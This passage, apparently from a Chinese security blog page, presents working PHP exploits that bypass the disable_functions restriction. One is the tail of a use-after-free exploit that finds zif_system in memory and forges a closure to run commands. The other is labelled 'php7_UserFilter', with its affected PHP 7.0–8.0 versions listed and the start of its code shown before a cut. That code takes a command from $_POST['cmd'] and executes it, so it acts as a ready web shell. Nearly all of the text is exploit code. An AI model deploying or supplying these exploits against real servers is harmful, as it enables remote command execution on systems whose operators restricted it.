class="hljs-variable">$abc_addr</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;abc) &lt; <span class="hljs-number">0x1337</span>) &#123;<br>            <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;uaf failed&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;a = <span class="hljs-string">&quot;leet&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;c = <span class="hljs-number">0xfeedface</span>;<br><br>        <span class="hljs-variable">$helper_handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_read</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="hljs-variable">$helper_handlers</span>);<br><br>        <span class="hljs-variable">$closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_read</span>(<span class="hljs-number">0x20</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;real closure @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_addr</span>);<br><br>        <span class="hljs-variable">$closure_ce</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_ce</span>);<br>        <br>        <span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$closure_ce</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="hljs-variable">$basic_funcs</span>);<br><br>        <span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;zif_system @ 0x%x&quot;</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_off</span> = <span class="hljs-number">0x70</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x138</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$i</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-variable">$i</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        <span class="hljs-variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x68</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$handler_offset</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_addr</span> = <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x18</span>;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;fake closure @ 0x%x&quot;</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br>        (<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$closure_addr</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">heap_leak</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$arr</span> = [[], []];<br>        <span class="hljs-title function_ invoke__">set_error_handler</span>(function() <span class="hljs-keyword">use</span> (&amp;$<span class="hljs-title">arr</span>, &amp;$<span class="hljs-title">buf</span>) &#123;<br>            $<span class="hljs-title">arr</span> = 1;<br>            <span class="hljs-variable">$buf</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span>);<br>        &#125;);<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] .= <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&quot;Array&quot;</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$buf</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">free</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&quot;Q*&quot;</span>, <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-variable">$addr</span>);<br>        <span class="hljs-variable">$payload</span> .= <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>));<br>        <br>        <span class="hljs-variable">$arr</span> = [[], []];<br>        <span class="hljs-title function_ invoke__">set_error_handler</span>(function() <span class="hljs-keyword">use</span> (&amp;$<span class="hljs-title">arr</span>, &amp;$<span class="hljs-title">buf</span>, &amp;$<span class="hljs-title">payload</span>) &#123;<br>            $<span class="hljs-title">arr</span> = 1;<br>            <span class="hljs-variable">$buf</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-number">1</span>);<br>        &#125;);<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] .= <span class="hljs-string">&quot;x&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rel_read</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$offset</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rel_write</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;abc[<span class="hljs-variable">$offset</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$value</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x10</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;helper-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$n</span> !== <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$value</span> &amp;= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable">$n</span> &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> === <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> !== <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span><br>            <span class="hljs-comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br>            <span class="hljs-comment">// In that case, changing the direction of the search should fix the crash.</span><br>            <span class="hljs-comment">// $addr += 0x10;</span><br>            <span class="hljs-variable">$addr</span> -= <span class="hljs-number">0x10</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">4</span>) === <span class="hljs-number">0xA8</span> &amp;&amp;<br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>),<br>                    [<span class="hljs-number">20180731</span>, <span class="hljs-number">20190902</span>, <span class="hljs-number">20200930</span>, <span class="hljs-number">20210902</span>])) &#123;<br>                <span class="hljs-variable">$module_name_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x20</span>);<br>                <span class="hljs-variable">$module_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$module_name_addr</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$module_name</span> === <span class="hljs-number">0x647261646e617473</span>) &#123;<br>                    <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;standard module @ 0x%x&quot;</span>, <span class="hljs-variable">$addr</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x28</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$format</span>, <span class="hljs-variable">$val</span> = <span class="hljs-string">&quot;&quot;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">LOGGING</span>) &#123;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span>(<span class="hljs-params"><span class="hljs-variable">$size</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-variable">$size</span>));<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$n</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="php7-UserFilter（PHP-7-0-8-0）"><a href="#php7-UserFilter（PHP-7-0-8-0）" class="headerlink" title="php7_UserFilter（PHP 7.0-8.0）"></a>php7_UserFilter（PHP 7.0-8.0）</h2><p><strong>利用条件</strong></p><ul><li>php5.* - exploitable with minor changes to the PoC</li><li>php7.0 - all versions to date</li><li>php7.1 - all versions to date</li><li>php7.2 - all versions to date</li><li>php7.3 - all versions to date</li><li>php7.4 &lt; 7.4.26</li><li>php8.0 &lt; 8.0.13</li></ul><p><strong>原理</strong></p><p><a href="https://bugs.php.net/bug.php?id=54350">Memory corruption with user_filter</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=54350</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-8.0 versions</span><br><span class="hljs-comment"># released as of 2021-10-06</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&#x27;uname -a&#x27;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOGGING&#x27;</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="hljs-number">0x20</span> : CHUNK_DATA_SIZE);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x50</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CMD&#x27;</span>, <span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$groom</span>[] = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">stream_filter_register</span>(<span class="hljs-string">&#x27;pwn_filter&#x27;</span>, <span class="hljs-string">&#x27;Pwn&#x27;</span>);<br>    <span class="hljs-variable">$fd</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">stream_filter_append</span>(<span class="hljs-variable">$fd</span>,<span class="hljs-string">&#x27;pwn_filter&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>; &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">php_user_filter</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$abc_addr</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$helper_addr</span>, <span class="hljs-variable">$helper_off</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$uafp</span>, <span class="hljs-variable">$hfp</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$in</span>, <span class="hljs-variable">$out</span>, &amp;<span class="hljs-variable">$consumed</span>, <span class="hljs-variable">$closing</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$closing</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-title function_ invoke__">stream_bucket_make_writeable</span>(<span class="hljs-variable">$in</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;filtername = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;stream);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">go</span>();<br>        <span class="hljs-keyword">return</span> PSFS_PASS_ON;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">go</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;abc = &amp;<span class="hljs-variable language_">$this</span>-&gt;filtername;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_uaf_obj</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_addr = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="hljs-number">2</span> - <span class="hljs-number">0x18</span>) - CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc_addr = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;abc @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_off = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - <span class="hljs-variable language_">$this</span>-&gt;abc_addr - <span class="hljs-number">0x18</span>;<br><br>        <span class="hljs-variable">$helper_handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="hljs-variable">$helper_handlers</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_leaker</span>();<br><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$helper_handlers</span> + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;binary leak @ 0x%x&quot;</span>, <span class="hljs-variable">$binary_leak</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_cleanup</span>(<span class="hljs-variable">$binary_leak</span>);<br><br>        <span class="hljs-variable">$closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;real closure @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_addr</span>);<br><br>        <span class="hljs-variable">$closure_ce</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span 